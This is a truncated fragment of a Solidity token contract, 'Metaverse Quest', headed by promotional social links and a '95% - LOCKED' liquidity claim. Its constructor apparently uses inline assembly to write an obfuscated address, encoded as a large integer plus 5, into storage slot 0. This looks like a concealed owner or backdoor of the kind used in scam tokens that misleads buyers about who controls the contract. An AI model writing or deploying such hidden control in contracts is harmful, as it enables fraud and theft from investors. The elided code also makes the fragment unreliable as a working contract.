/*
Welcome to Metaverse Quest Metaverse.

Telegram: https://t.me/MetaverseQuest/
Twitter: https://twitter.com/MetaverseQuest/
Website: https://MetaverseQuest.finance
95% - LOCKED
...
contract MetaverseQuest {
    string public constant name = "Metaverse Quest";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(657978166864698692428364007635368855622039666094, 5))}
